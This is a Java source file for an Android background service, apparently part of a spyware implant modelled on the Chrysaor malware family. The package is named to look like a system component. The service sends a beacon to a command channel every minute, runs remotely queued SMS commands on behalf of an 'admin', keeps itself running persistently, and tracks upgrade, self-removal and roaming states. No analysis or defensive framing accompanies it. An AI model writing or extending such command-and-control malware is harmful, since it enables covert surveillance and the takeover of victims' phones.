package com.android.chrysaoralike;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class HttpCommandService extends Service {
    private static final String TAG = "HttpCommandService";
    private static final long BEACON_INTERVAL_SECONDS = 60;
    private ScheduledExecutorService scheduler;
    private HttpChannel httpChannel;
    private CommandHandler commandHandler;
    private boolean isUpgrading = false, isRemoving = false;
    private String adminChatId = "admin";

    private BroadcastReceiver forceBeaconReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.i(TAG, "Forcing immediate beacon via broadcast");
            beaconLoop();
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "HttpCommandService starting...");
        httpChannel = new HttpChannel(this);
        commandHandler = new CommandHandler(this);
        SharedPreferences prefs = getSharedPreferences("chrysaor_config", Context.MODE_PRIVATE);
        isUpgrading = prefs.getBoolean("is_upgrading", false);
        isRemoving = prefs.getBoolean("is_removing", false);
        boolean isRoaming = prefs.getBoolean("is_roaming", false);
        boolean allowRoaming = prefs.getBoolean("allow_roaming_http", true);
        commandHandler.setUpgrading(isUpgrading);
        commandHandler.setRemoving(isRemoving);
        commandHandler.setRoaming(isRoaming);
        commandHandler.setAllowRoaming(allowRoaming);

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::beaconLoop, 0, BEACON_INTERVAL_SECONDS, TimeUnit.SECONDS);

        // Queue processor
        new Thread(() -> {
            CommandQueue queue = CommandQueue.getInstance();
            while (true) {
                SmsCommand cmd = queue.poll();
                if (cmd != null) {
                    Log.i(TAG, "Processing queued command: " + cmd.commandId);
                    commandHandler.execute(cmd, adminChatId);
                } else {
                    try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                }
            }
        }).start();

        registerReceiver(forceBeaconReceiver, new IntentFilter("com.android.chrysaoralike.FORCE_BEACON"));
        Log.i(TAG, "HttpCommandService fully initialized.");
    }

    private void beaconLoop() {
        if (isUpgrading || isRemoving) return;
        Log.i(TAG, "HTTP beacon sending...");
        if (httpChannel.sendBeacon()) Log.i(TAG, "HTTP beacon succeeded.");
        else Log.w(TAG, "HTTP beacon failed.");
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public void onDestroy() { if (scheduler != null) scheduler.shutdownNow(); unregisterReceiver(forceBeaconReceiver); super.onDestroy(); }
    @Override public IBinder onBind(Intent intent) { return null; }
    public void updateState(boolean upgrading, boolean removing, boolean roaming, boolean allowRoaming) {
        this.isUpgrading = upgrading; this.isRemoving = removing;
        commandHandler.setUpgrading(upgrading); commandHandler.setRemoving(removing);
        commandHandler.setRoaming(roaming); commandHandler.setAllowRoaming(allowRoaming);
    }
}